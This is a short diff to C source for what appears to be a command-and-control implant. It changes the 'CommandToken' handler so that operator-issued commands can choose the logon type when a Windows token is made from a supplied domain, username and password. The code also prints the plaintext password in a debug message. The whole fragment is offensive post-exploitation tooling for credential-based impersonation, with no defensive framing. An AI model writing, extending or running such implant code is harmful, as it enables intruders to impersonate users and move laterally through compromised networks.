@@ -1537,6 +1537,7 @@ VOID CommandToken( PPARSER Parser )
             PWCHAR lpDomain       = ParserGetWString( Parser, &dwDomainSize );
             PWCHAR lpUser         = ParserGetWString( Parser, &dwUserSize );
             PWCHAR lpPassword     = ParserGetWString( Parser, &dwPasswordSize );
+            DWORD  LogonType      = ParserGetInt32( Parser );
             CHAR   Deli[ 2 ]      = { '\\', 0 };
             HANDLE hToken         = NULL;
             PWCHAR UserDomain     = NULL;
@@ -1548,9 +1549,9 @@ VOID CommandToken( PPARSER Parser )
 
             if ( dwUserSize > 0 && dwPasswordSize > 0 && dwDomainSize > 0 )
             {
-                PRINTF( "Create new token: Domain:[%ls] User:[%ls] Password:[%ls]\n", lpDomain, lpUser, lpPassword )
+                PRINTF( "Create new token: Domain:[%ls] User:[%ls] Password:[%ls] LogonType:[%d]\n", lpDomain, lpUser, lpPassword, LogonType )
 
-                hToken = TokenMake( lpUser, lpPassword, lpDomain );
+                hToken = TokenMake( lpUser, lpPassword, lpDomain, LogonType );
                 if ( hToken != NULL )
                 {
                     UserDomain = Instance->Win32.LocalAlloc( LPTR, UserDomainSize );
